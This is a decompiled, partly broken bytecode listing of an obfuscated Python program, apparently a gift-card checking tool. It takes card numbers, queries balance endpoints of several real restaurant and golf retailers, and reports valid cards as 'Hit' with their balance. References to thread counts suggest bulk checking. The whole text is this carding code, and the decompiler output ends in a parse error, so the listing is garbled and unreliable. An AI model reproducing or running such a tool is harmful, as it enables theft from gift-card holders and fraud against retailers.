
 L. 408       214  LOAD_GLOBAL              print
              216  CALL_FUNCTION_0       0  '0 positional arguments'
              218  POP_TOP          

 L. 409       220  LOAD_GLOBAL              Engine
              222  LOAD_METHOD              ErbertAndGerberts
              224  LOAD_FAST                'O00OOO0OO0OO00OO0'
              226  CALL_METHOD_1         1  '1 positional argument'
              228  POP_TOP          
              230  POP_BLOCK        
              232  JUMP_FORWARD        816  'to 816'
            234_0  COME_FROM_EXCEPT    200  '200'

 L. 410       234  POP_TOP          
              236  POP_TOP          
              238  POP_TOP          

 L. 411       240  LOAD_GLOBAL              print
              242  LOAD_STR                 '\x1b[31m[!] Invalid Threads Amount.\x1b[31m'
              244  CALL_FUNCTION_1       1  '1 positional argument'
              246  POP_TOP          

 L. 412       248  LOAD_GLOBAL              time
              250  LOAD_METHOD              sleep
              252  LOAD_CONST               2
              254  CALL_METHOD_1         1  '1 positional argument'
              256  POP_TOP          

 L. 413       258  LOAD_GLOBAL              Menu
              260  CALL_FUNCTION_0       0  '0 positional arguments'
              262  POP_TOP          
              264  POP_EXCEPT       
              266  JUMP_FORWARD        816  'to 816'
              268  END_FINALLY      
          270_272  JUMP_FORWARD        816  'to 816'
            274_0  COME_FROM           196  '196'

 L. 414       274  LOAD_FAST                'OO0O00000O0000O0O'
              276  LOAD_STR                 '6'
              278  COMPARE_OP               ==
          280_282  POP_JUMP_IF_FALSE   462  'to 462'

 L. 415       284  LOAD_GLOBAL              input
              286  LOAD_STR                 '\x1b[36m[?] Giftcard:\x1b[36m '
              288  CALL_FUNCTION_1       1  '1 positional argument'
              290  STORE_FAST               'OO00OO0O0000OOO0O'

 L. 416       292  LOAD_GLOBAL              requests
              294  LOAD_METHOD              get
              296  LOAD_STR                 'https://www.erbertandgerberts.com/wp-content/themes/erbertandgerberts/ajax/gift-card-balance.php?cardNumber='
              298  LOAD_FAST                'OO00OO0O0000OOO0O'
              300  FORMAT_VALUE          0  ''
              302  BUILD_STRING_2        2 
              304  CALL_METHOD_1         1  '1 positional argument'
              306  STORE_FAST               'O0O00O000OO000O00'

 L. 417       308  LOAD_STR                 'Remaining balance:'
              310  LOAD_FAST                'O0O00O000OO000O00'
              312  LOAD_ATTR                text
              314  COMPARE_OP               in
          316_318  POP_JUMP_IF_FALSE   418  'to 418'

 L. 418       320  LOAD_FAST                'O0O00O000OO000O00'
              322  LOAD_ATTR                text
              324  LOAD_METHOD              split
              326  LOAD_STR                 '$'
              328  CALL_METHOD_1         1  '1 positional argument'
              330  LOAD_CONST               1
              332  BINARY_SUBSCR    
              334  LOAD_METHOD              split
              336  LOAD_STR                 '</p>'
              338  CALL_METHOD_1         1  '1 positional argument'
              340  LOAD_CONST               0
              342  BINARY_SUBSCR    
              344  STORE_FAST               'OOO00O00OO0OOOO0O'

 L. 419       346  LOAD_FAST                'OOO00O00OO0OOOO0O'
              348  LOAD_STR                 '0.00'
              350  COMPARE_OP               ==
          352_354  POP_JUMP_IF_FALSE   386  'to 386'

 L. 420       356  LOAD_GLOBAL              print
              358  LOAD_STR                 '\x1b[31m[-] Invalid | '
              360  LOAD_FAST                'OO00OO0O0000OOO0O'
              362  FORMAT_VALUE          0  ''
              364  LOAD_STR                 '\x1b[31m'
              366  BUILD_STRING_3        3 
              368  CALL_FUNCTION_1       1  '1 positional argument'
              370  POP_TOP          

 L. 421       372  LOAD_GLOBAL              input
              374  CALL_FUNCTION_0       0  '0 positional arguments'
              376  POP_TOP          

 L. 422       378  LOAD_GLOBAL              Menu
              380  CALL_FUNCTION_0       0  '0 positional arguments'
              382  POP_TOP          
              384  JUMP_FORWARD        418  'to 418'
            386_0  COME_FROM           352  '352'

 L. 424       386  LOAD_GLOBAL              print
              388  LOAD_STR                 '[\x1b[36m+\x1b[36m] Hit \x1b[36m| \x1b[36m '
              390  LOAD_FAST                'OO00OO0O0000OOO0O'
              392  FORMAT_VALUE          0  ''
              394  LOAD_STR                 ' \x1b[36m | \x1b[36m Balance: $'
              396  LOAD_FAST                'OOO00O00OO0OOOO0O'
              398  FORMAT_VALUE          0  ''
              400  BUILD_STRING_4        4 
              402  CALL_FUNCTION_1       1  '1 positional argument'
              404  POP_TOP          

 L. 425       406  LOAD_GLOBAL              input
              408  CALL_FUNCTION_0       0  '0 positional arguments'
              410  POP_TOP          

 L. 426       412  LOAD_GLOBAL              Menu
              414  CALL_FUNCTION_0       0  '0 positional arguments'
              416  POP_TOP          
            418_0  COME_FROM           384  '384'
            418_1  COME_FROM           316  '316'

 L. 427       418  LOAD_STR                 'Error'
              420  LOAD_FAST                'O0O00O000OO000O00'
              422  LOAD_ATTR                text
              424  COMPARE_OP               in
          426_428  POP_JUMP_IF_FALSE   816  'to 816'

 L. 428       430  LOAD_GLOBAL              print
              432  LOAD_STR                 '\x1b[31m[-] Invalid | '
              434  LOAD_FAST                'OO00OO0O0000OOO0O'
              436  FORMAT_VALUE          0  ''
              438  LOAD_STR                 '\x1b[31m'
              440  BUILD_STRING_3        3 
              442  CALL_FUNCTION_1       1  '1 positional argument'
              444  POP_TOP          

 L. 429       446  LOAD_GLOBAL              input
              448  CALL_FUNCTION_0       0  '0 positional arguments'
              450  POP_TOP          

 L. 430       452  LOAD_GLOBAL              Menu
              454  CALL_FUNCTION_0       0  '0 positional arguments'
              456  POP_TOP          
          458_460  JUMP_FORWARD        816  'to 816'
            462_0  COME_FROM           280  '280'

 L. 431       462  LOAD_FAST                'OO0O00000O0000O0O'
              464  LOAD_STR                 '4'
              466  COMPARE_OP               ==
          468_470  POP_JUMP_IF_FALSE   650  'to 650'

 L. 432       472  LOAD_GLOBAL              input
              474  LOAD_STR                 '\x1b[36m[?] Giftcard:\x1b[36m '
              476  CALL_FUNCTION_1       1  '1 positional argument'
              478  STORE_FAST               'OO00OO0O0000OOO0O'

 L. 433       480  LOAD_GLOBAL              requests
              482  LOAD_METHOD              get
              484  LOAD_STR                 'https://giftcard.golfnow.com/api/checkBalance?number='
              486  LOAD_FAST                'OO00OO0O0000OOO0O'
              488  FORMAT_VALUE          0  ''
              490  BUILD_STRING_2        2 
              492  CALL_METHOD_1         1  '1 positional argument'
              494  STORE_FAST               'O0O00O000OO000O00'

 L. 434       496  LOAD_STR                 'balance'
              498  LOAD_FAST                'O0O00O000OO000O00'
              500  LOAD_ATTR                text
              502  COMPARE_OP               in
          504_506  POP_JUMP_IF_FALSE   620  'to 620'

 L. 435       508  LOAD_FAST                'O0O00O000OO000O00'
              510  LOAD_METHOD              json
              512  CALL_METHOD_0         0  '0 positional arguments'
              514  LOAD_STR                 'balance'
              516  BINARY_SUBSCR    
              518  LOAD_STR                 '1'
              520  COMPARE_OP               ==
          522_524  POP_JUMP_IF_TRUE    544  'to 544'
              526  LOAD_FAST                'O0O00O000OO000O00'
              528  LOAD_METHOD              json
              530  CALL_METHOD_0         0  '0 positional arguments'
              532  LOAD_STR                 'balance'
              534  BINARY_SUBSCR    
              536  LOAD_STR                 '0.00'
              538  COMPARE_OP               ==
          540_542  POP_JUMP_IF_FALSE   574  'to 574'
            544_0  COME_FROM           522  '522'

 L. 436       544  LOAD_GLOBAL              print
              546  LOAD_STR                 '\x1b[31m[-] Invalid | '
              548  LOAD_FAST                'OO00OO0O0000OOO0O'
              550  FORMAT_VALUE          0  ''
              552  LOAD_STR                 '\x1b[31m'
              554  BUILD_STRING_3        3 
              556  CALL_FUNCTION_1       1  '1 positional argument'
              558  POP_TOP          

 L. 437       560  LOAD_GLOBAL              input
              562  CALL_FUNCTION_0       0  '0 positional arguments'
              564  POP_TOP          

 L. 438       566  LOAD_GLOBAL              Menu
              568  CALL_FUNCTION_0       0  '0 positional arguments'
              570  POP_TOP          
              572  JUMP_FORWARD        618  'to 618'
            574_0  COME_FROM           540  '540'

 L. 440       574  LOAD_FAST                'O0O00O000OO000O00'
              576  LOAD_METHOD              json
              578  CALL_METHOD_0         0  '0 positional arguments'
              580  LOAD_STR                 'balance'
              582  BINARY_SUBSCR    
              584  STORE_FAST               'OOO00O00OO0OOOO0O'

 L. 441       586  LOAD_GLOBAL              print
              588  LOAD_STR                 '[\x1b[36m+\x1b[36m] Hit \x1b[36m| \x1b[36m '
              590  LOAD_FAST                'OO00OO0O0000OOO0O'
              592  FORMAT_VALUE          0  ''
              594  LOAD_STR                 ' \x1b[36m | \x1b[36m Balance: $'
              596  LOAD_FAST                'OOO00O00OO0OOOO0O'
              598  FORMAT_VALUE          0  ''
              600  BUILD_STRING_4        4 
              602  CALL_FUNCTION_1       1  '1 positional argument'
              604  POP_TOP          

 L. 442       606  LOAD_GLOBAL              input
              608  CALL_FUNCTION_0       0  '0 positional arguments'
              610  POP_TOP          

 L. 443       612  LOAD_GLOBAL              Menu
              614  CALL_FUNCTION_0       0  '0 positional arguments'
              616  POP_TOP          
            618_0  COME_FROM           572  '572'
              618  JUMP_FORWARD        648  'to 648'
            620_0  COME_FROM           504  '504'

 L. 445       620  LOAD_GLOBAL              print
              622  LOAD_STR                 '\x1b[31m[-] Invalid | '
              624  LOAD_FAST                'OO00OO0O0000OOO0O'
              626  FORMAT_VALUE          0  ''
              628  LOAD_STR                 '\x1b[31m'
              630  BUILD_STRING_3        3 
              632  CALL_FUNCTION_1       1  '1 positional argument'
              634  POP_TOP          

 L. 446       636  LOAD_GLOBAL              input
              638  CALL_FUNCTION_0       0  '0 positional arguments'
              640  POP_TOP          

 L. 447       642  LOAD_GLOBAL              Menu
              644  CALL_FUNCTION_0       0  '0 positional arguments'
              646  POP_TOP          
            648_0  COME_FROM           618  '618'
              648  JUMP_FORWARD        816  'to 816'
            650_0  COME_FROM           468  '468'

 L. 448       650  LOAD_FAST                'OO0O00000O0000O0O'
              652  LOAD_STR                 '5'
              654  COMPARE_OP               ==
          656_658  POP_JUMP_IF_FALSE   792  'to 792'

 L. 449       660  LOAD_GLOBAL              input
              662  LOAD_STR                 '\x1b[36m[?] Giftcard:\x1b[36m '
              664  CALL_FUNCTION_1       1  '1 positional argument'
              666  STORE_FAST               'OO00OO0O0000OOO0O'

 L. 450       668  LOAD_GLOBAL              requests
              670  LOAD_METHOD              get
              672  LOAD_STR                 'https://fatz.com/balance-checker/?cn='
              674  LOAD_FAST                'OO00OO0O0000OOO0O'
              676  FORMAT_VALUE          0  ''
              678  BUILD_STRING_2        2 
              680  CALL_METHOD_1         1  '1 positional argument'
              682  STORE_FAST               'O0O00O000OO000O00'

 L. 451       684  LOAD_FAST                'O0O00O000OO000O00'
              686  LOAD_ATTR                text
              688  LOAD_METHOD              split
              690  LOAD_STR                 'You have '
              692  CALL_METHOD_1         1  '1 positional argument'
              694  LOAD_CONST               1
              696  BINARY_SUBSCR    
              698  LOAD_METHOD              split
              700  LOAD_STR                 'remaining'
              702  CALL_METHOD_1         1  '1 positional argument'
              704  LOAD_CONST               0
              706  BINARY_SUBSCR    
              708  STORE_FAST               'OOO00O00OO0OOOO0O'

 L. 452       710  LOAD_FAST                'OOO00O00OO0OOOO0O'
              712  LOAD_STR                 '$0.01'
              714  COMPARE_OP               >
          716_718  POP_JUMP_IF_FALSE   752  'to 752'

 L. 453       720  LOAD_GLOBAL              print
              722  LOAD_STR                 '[\x1b[36m+\x1b[36m] Hit \x1b[36m| \x1b[36m '
              724  LOAD_FAST                'OO00OO0O0000OOO0O'
              726  FORMAT_VALUE          0  ''
              728  LOAD_STR                 ' \x1b[36m | \x1b[36m Balance: $'
              730  LOAD_FAST                'OOO00O00OO0OOOO0O'
              732  FORMAT_VALUE          0  ''
              734  BUILD_STRING_4        4 
              736  CALL_FUNCTION_1       1  '1 positional argument'
              738  POP_TOP          

 L. 454       740  LOAD_GLOBAL              input
              742  CALL_FUNCTION_0       0  '0 positional arguments'
              744  POP_TOP          

 L. 455       746  LOAD_GLOBAL              Menu
              748  CALL_FUNCTION_0       0  '0 positional arguments'
              750  POP_TOP          
            752_0  COME_FROM           716  '716'

 L. 456       752  LOAD_FAST                'OOO00O00OO0OOOO0O'
              754  LOAD_STR                 '$0.01'
              756  COMPARE_OP               <
          758_760  POP_JUMP_IF_FALSE   816  'to 816'

 L. 457       762  LOAD_GLOBAL              print
              764  LOAD_STR                 '\x1b[31m[-] Invalid | '
              766  LOAD_FAST                'OO00OO0O0000OOO0O'
              768  FORMAT_VALUE          0  ''
              770  LOAD_STR                 '\x1b[31m'
              772  BUILD_STRING_3        3 
              774  CALL_FUNCTION_1       1  '1 positional argument'
            776_0  COME_FROM           232  '232'
            776_1  COME_FROM           148  '148'
              776  POP_TOP          

 L. 458       778  LOAD_GLOBAL              input
              780  CALL_FUNCTION_0       0  '0 positional arguments'
              782  POP_TOP          

 L. 459       784  LOAD_GLOBAL              Menu
              786  CALL_FUNCTION_0       0  '0 positional arguments'
              788  POP_TOP          
              790  JUMP_FORWARD        816  'to 816'
            792_0  COME_FROM           656  '656'

 L. 461       792  LOAD_GLOBAL              print
              794  LOAD_STR                 '\x1b[31m[!] Invalid Option\x1b[31m'
              796  CALL_FUNCTION_1       1  '1 positional argument'
              798  POP_TOP          

 L. 462       800  LOAD_GLOBAL              time
              802  LOAD_METHOD              sleep
              804  LOAD_CONST               2
              806  CALL_METHOD_1         1  '1 positional argument'
              808  POP_TOP          
            810_0  COME_FROM           266  '266'
            810_1  COME_FROM           182  '182'

 L. 463       810  LOAD_GLOBAL              Menu
              812  CALL_FUNCTION_0       0  '0 positional arguments'
              814  POP_TOP          
            816_0  COME_FROM           790  '790'
            816_1  COME_FROM           758  '758'
            816_2  COME_FROM           648  '648'
            816_3  COME_FROM           458  '458'
            816_4  COME_FROM           426  '426'
            816_5  COME_FROM           270  '270'
            816_6  COME_FROM           186  '186'
            816_7  COME_FROM           104  '104'

Parse error at or near `POP_TOP' instruction at offset 776


if __name__ == '__main__':
    Menu()